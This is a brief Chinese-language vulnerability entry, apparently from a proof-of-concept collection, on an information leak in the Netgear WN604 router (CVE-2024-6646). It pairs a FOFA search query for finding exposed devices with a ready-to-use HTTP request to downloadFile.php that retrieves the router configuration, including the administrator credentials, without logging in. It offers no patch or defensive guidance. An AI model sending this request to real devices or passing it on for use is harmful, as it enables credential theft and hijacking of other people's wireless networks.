# Netgear-WN604接口downloadFile.php信息泄露漏洞(CVE-2024-6646)

Netgear WN604 downloadFile.php接口处存在信息泄露漏洞，文件身份验证的远程攻击者可以利用此漏洞获取无线路由器的管理员账号密码信息，导致路由器后台被控，攻击者可对无线网络发起破坏或进一步威胁。

## fofa

```yaml
title=="Netgear"
```

## poc

```yaml
GET /downloadFile.php?file=config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407162316664.png)